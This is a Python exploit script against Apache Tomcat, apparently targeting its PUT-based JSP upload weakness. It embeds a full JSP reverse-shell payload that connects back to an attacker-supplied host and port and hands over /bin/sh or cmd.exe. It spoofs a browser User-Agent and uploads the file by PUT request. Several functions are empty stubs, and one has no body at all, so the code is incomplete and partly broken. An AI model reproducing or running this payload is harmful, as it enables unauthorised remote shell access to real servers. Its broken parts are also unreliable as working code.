#!/bin/python3

import requests
import threading
import argparse
import pwncat.manager

class ApacheTomcatExploit:
    def __init__(self):
        self.payload_file = '/YKSBjswJKSWInkjw.jsp'  # The payload file that will be uploaded for a shell
        self.headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3'}

    def config_payload(self, lhost, lport):
        # The revshell payload that will be uploaded from the file
        payload = """
            <b>Starting reverse shell...</b>
            <%@page import="java.lang.*"%>
            <%@page import="java.util.*"%>
            <%@page import="java.io.*"%>
            <%@page import="java.net.*"%>
            <%
              class StreamConnector extends Thread {
                InputStream aj;
                OutputStream hv;
                StreamConnector(InputStream aj, OutputStream hv) {
                  this.aj = aj;
                  this.hv = hv;
                }

                public void run() {
                  BufferedReader na  = null;
                  BufferedWriter jDf = null;
                  try {
                    na  = new BufferedReader(new InputStreamReader(this.aj));
                    jDf = new BufferedWriter(new OutputStreamWriter(this.hv));
                    char buffer[] = new char[8192];
                    int length;
                    while((length = na.read(buffer, 0, buffer.length)) > 0) {
                      jDf.write(buffer, 0, length);
                      jDf.flush();
                    }
                  } catch(Exception e) {}
                  try {
                    if(na != null)
                      na.close();
                    if(jDf != null)
                      jDf.close();
                  } catch(Exception e) {}
                }
              }

              try {
                String ShellPath;
                if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                  ShellPath = new String("/bin/sh");
                } else {
                  ShellPath = new String("cmd.exe");
                }

                Socket socket = new Socket("""" + lhost + """", """ + lport + """);
                Process process = Runtime.getRuntime().exec(ShellPath);
                (new StreamConnector(process.getInputStream(), socket.getOutputStream())).start();
                (new StreamConnector(socket.getInputStream(), process.getOutputStream())).start();
              } catch(Exception e) {}
            %>
        """

    def detect_vuln(self, target):
        # Standard vuln detection process

    def scanner(self, target):
        # The scanner for detecting the vuln
        pass

    def listener(self, lhost, lport, bindport=False):
        # The listener to catch the revshell when executed
        pass

    def exploit(self, target):
        # The main exploit, a PUT request is being issued here for uploading
        response = requests.put(
            target + self.payload_file,
            headers=self.headers,
            timeout=10
        )
